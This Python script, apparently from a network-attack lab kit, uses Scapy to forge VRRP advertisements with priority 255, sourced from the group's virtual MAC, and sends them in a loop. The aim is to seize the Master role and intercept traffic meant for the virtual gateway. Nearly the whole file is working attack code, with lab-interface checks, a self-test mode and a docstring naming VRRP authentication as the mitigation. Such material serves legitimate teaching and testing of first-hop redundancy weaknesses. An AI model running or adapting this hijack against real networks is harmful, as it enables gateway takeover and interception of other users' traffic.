#!/usr/bin/env python3
"""FHRP: send a higher-priority VRRP advertisement to become Master and
intercept the virtual router's traffic. Mitigation: VRRP authentication."""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from common import base_parser, enforce_lab_iface, require_scapy, status, run_loop, selftest_ok  # noqa: E402


def build_vrrp(scapy_all, vrid, virtual_ip, priority):
    from scapy.layers.vrrp import VRRP
    Ether, IP = scapy_all.Ether, scapy_all.IP
    # Source from the VRRP virtual MAC 00:00:5e:00:01:<vrid> — how a real hijack
    # draws the group's traffic to the attacker (the switch learns the vMAC on
    # our port). Also a valid non-zero L2 source, so the PNetLab link bridge
    # forwards it (an unset source egresses all-zero and is dropped by
    # br_handle_frame before reaching the peer — see common.py).
    vmac = "00:00:5e:00:01:%02x" % (vrid & 0xff)
    return (Ether(src=vmac, dst="01:00:5e:00:00:12") /
            IP(dst="224.0.0.18", proto=112) /
            VRRP(vrid=vrid, priority=priority, addrlist=[virtual_ip]))


def main():
    p = base_parser("VRRP hijack: forge a higher-priority advertisement")
    p.add_argument("--vrid", type=int, default=1)
    p.add_argument("--virtual_ip", default="192.168.1.1")
    p.add_argument("--priority", type=int, default=255)
    args = p.parse_args()
    enforce_lab_iface(args.iface)
    require_scapy()
    import scapy.all as scapy_all

    pkt = build_vrrp(scapy_all, args.vrid, args.virtual_ip, args.priority)
    if args.selftest:
        selftest_ok("vrrp_hijack", "VRRP advertisement len=%d" % len(bytes(pkt)))
        return

    def send(n):
        scapy_all.sendp(build_vrrp(scapy_all, args.vrid, args.virtual_ip, args.priority), iface=args.iface, verbose=0)
        status("SENT", "advertisement #%d vrid=%d vip=%s priority=%d" %
               (n + 1, args.vrid, args.virtual_ip, args.priority))

    run_loop(args.count, args.interval, send)


if __name__ == "__main__":
    main()

